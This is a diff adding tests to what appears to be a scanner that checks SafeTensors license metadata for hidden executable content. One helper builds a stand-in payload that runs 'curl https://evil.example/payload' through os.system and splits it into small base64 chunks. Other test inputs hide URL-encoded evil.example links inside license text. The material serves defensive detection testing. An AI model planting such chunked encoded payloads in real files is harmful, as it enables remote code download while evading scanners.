@@ -109,6 +109,14 @@ def executable_wrapped_base64_lines(widths: tuple[int, ...] = (76,)) -> list[str
     return lines
 
 
+def padded_executable_wrapped_base64_lines(chunk_size: int = 2) -> list[str]:
+    payload = ("import os\nos.system('curl https://evil.example/payload')\n" * 8).encode("utf-8")
+    return [
+        base64.b64encode(payload[index : index + chunk_size]).decode("ascii")
+        for index in range(0, len(payload), chunk_size)
+    ]
+
+
 def comment_separated_executable_wrapped_base64_tail() -> str:
     return "\n# continued\n".join(executable_wrapped_base64_lines())
 
@@ -473,6 +481,23 @@ def test_license_document_reconstructs_infix_annotated_wrapped_base64_tail() -> 
     assert not SafeTensorsScanner._looks_like_ordinary_license_document(payload)
 
 
+def test_license_document_reconstructs_padded_wrapped_base64_tail() -> None:
+    license_text = ordinary_license_text_with_url()
+    tail = "\n".join(f"License grant {line}" for line in padded_executable_wrapped_base64_lines())
+    payload = f"{license_text}\n{tail}"
+
+    assert SafeTensorsScanner._looks_like_ordinary_license_document(license_text)
+    assert not SafeTensorsScanner._looks_like_ordinary_license_document(payload)
+
+
+def test_license_document_rejects_encoded_url_tail() -> None:
+    license_text = ordinary_license_text_with_url()
+    payload = f"{license_text}\nEncoded reference: https%3A%2F%2Fevil.example%2Fx"
+
+    assert SafeTensorsScanner._is_ordinary_license_metadata_value("license", license_text, metadata_is_valid=True)
+    assert not SafeTensorsScanner._is_ordinary_license_metadata_value("license", payload, metadata_is_valid=True)
+
+
 def test_license_url_residual_encoding_fails_closed() -> None:
     encoded_prefix = encode_url_path("/releases/download/v1", passes=5)
 
@@ -564,6 +589,7 @@ def test_license_metadata_executable_content_is_not_suppressed(tmp_path: Path) -
         "https://github.com/Lightricks/LTX-2/blob/main/license.py%00.txt",
         "https://github.com/Lightricks/LTX-2/%5Creleases%5Cdownload%5Cv1/license",
         "https://opensource.org/licenses/MIT,https://evil.example/x",
+        "https%3A%2F%2Fevil.example%2Fx",
         "https://opensource.org/licenses/MIT?u=https://evil.example/x",
         "https://[",
     ],
@@ -761,6 +787,10 @@ def test_license_metadata_standard_wrapped_base64_tail_keeps_length_and_s905(tmp
         (
             "\n".join(f"License grant {line} under terms" for line in executable_wrapped_base64_lines((4,))),
             "infix_prefixed",
+        ),
+        (
+            "\n".join(f"License grant {line}" for line in padded_executable_wrapped_base64_lines()),
+            "padded_prefixed",
         ),
         (
             "\nThis license paragraph continues under applicable law.\n".join(executable_wrapped_base64_lines((76,))),
